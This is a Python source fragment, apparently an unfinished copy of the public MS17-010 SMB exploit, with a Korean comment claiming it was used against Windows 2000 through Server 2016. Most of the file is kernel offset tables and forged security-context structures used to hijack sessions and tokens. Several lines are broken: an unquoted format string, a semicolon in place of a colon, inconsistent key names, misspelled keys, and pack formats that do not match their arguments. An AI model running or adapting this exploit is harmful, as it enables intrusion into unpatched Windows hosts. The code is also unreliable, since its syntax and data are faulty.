from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys 
import socket
import time

'''
CVE MS17-010 
아래의 시스템에서 exploit 하였습니다.

- windows 2016 (x64)
- windows 10 PRO (Build 10240 (x64))
- windows 2012 R2(x64)
- windows 8.1 (x64)
- windows 2008 R2 SP1 (x64)
- windows 7 SP1 (x64)
- windows 2008 SP1 (x64)
- windows 2003 R2 SP2 (x64)
- windows xp SP2 (x64)
- windows 8.1 (x86)
- windows 7 SP1 (x86)
- windows 2008 SP1 (x86)
- windows 2003 SP2 (x86)
- windows xp SP3 (x86)
- windows 2000 SP4 (x86)
'''

username = ''
password = ''


#windows 7 session info
WIN7_64_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET' : 0xa0,
    'SESSION_ISNULL' : 0xba,
    'FAKE_SECCTX' : pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
    'SECCTX_SIZE' : 0x28,
}


WIN7_32_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET' : 0x80,
    'SESSION_ISNULL_OFFSET' : 0x96,
    'FAKE_SECCTX' : pack('<IIIIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
    'SECCTX_SIZE' :0x1c,
}

#windows 8 session info
WIN8_64_SESSION_INFO = {
    'SESSION_SECCTX' : 0Xb0,
    'SESSION_ISNULL_OFFSET' : 0xca,
    'FAKE_SECCTX' : pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
    'SECCTX_SIZE' : 0x38,
}

WIN8_32_SESSION_INFO = {
    'SESSION_SECCTX_OFFSET' : 0x88,
    'SESSION_ISNULL_OFFSET' : 0x9e,
    'FAKE_SECCTX' : pack(<IIIIIIIIB, 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
    'SECCTX_SIZE' ; 0x24,
}

#windows server 2003 session info
WIN2K3_64_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET' : 0xba,
    'SESSION_SECCTX_OFFSET' : 0xa0,
    'SECCTX_PCTXTHANDLE_OFFSET' : 0x10,
    'PCTXTHANDLE_TOKEN_OFFSET' : 0x40,
    'TOKEN_USER_GROUP_CNT_OFFSET' : 0x4c,
    'TOKEN_USER_GROUP-ADDR_OFFSET' : 0x68,
}

WIN2K3_32_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET' : 0x96,
    'SESSION_SECCTX_OFFSET' : 0x80,
    'SECCTX_PCTXHANDLE_OFFSET' : 0xc,
    'PCTXTHANDLE_TOKEN_OFFSET' : 0x24,
    'TOKEN_USER_GROUP_CNT_OFFSET' : 0x4c,
    'TOKEN_USER_GROUP_ADDR_OFFSET' : 0x68,
}

#windows xp info
WINXP_32_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET' : 0x94,
    'SESSION_SECCTX_OFFSET' : 0x84,
    'PCTXTHANDLE_TOKEN_OFFSET' : 0x24,
    'TOKEN_USER_GROUP_CNT_OFFSET' :0x4c,
    'TOKEN_USER_GROUP_ADDR_OFFSET' : 0x68,
}

WIN2K_32_SESSION_INFO = {
    'SESSION_ISNULL_OFFSET' : 0x94,
    'SESSION_SECCTX_OFFSET' :0x84,
    'PCTXTHANDLE_TOKEN_OFFSET' : 0x24,
    'TOKEN_USER_GROUP_CNT_OFFSET' : 0x3c,
    'TOKEN_USER_GROUP_ADDR_OFFSET' : 0x58,
}

# windows 2008 ~
WIN7_32_TRANS_INFO = {
    'TRANS_SIZE' : 0xa0,
    'TRANS_FLINK_OFFSET' : 0x18,
    'TRANS_INPARAM_OFFSET' : 0x40,
    'TRANS_OUTPARAM_OFFSET' : 0x44,
    'TRANS_INDATA_OFFSET' : 0x48,
    'TRANS_OUTDATA_OFFSET' : 0x4c,
    'TRANS_PARAMCNT_OFFSET' : 0x58,
    'TRANS_TOTALPARAMCNT_OFFSET' : 0x5c,
    'TRANS_FUNCTION_OFFSET' : 0x72,
    'TRANS_MID_OFFSET' : 0x80,
}

WIN7_64_TRANS_INFO = {
    'TRANS_SIZE' : 0xf8,
    'TRANS_FLINK_OFFSET' : 0x28,
    'TRANS_INPARAM_OFFSET' : 0x70,
    'TRANS_OUTPARAM_OFFSET' : 0x78,
    'TRANS_INDATA_OFFSET' : 0x80,
    'TRANS_OUTDATA_OFFSET' : 0x88,
    'TRANS_PARAMCNT_OFFSET' : 0x98,
    'TRANAS_TOTALPARAMCNT_OFFSET' : 0x9c,
    'TRANS_FUNCTION_OFFSET' : 0xb2,
    'TRANS_MID_OFFSET' : 0xc0,
}

WIN5_32_TRAMS_INFO = {
    
}
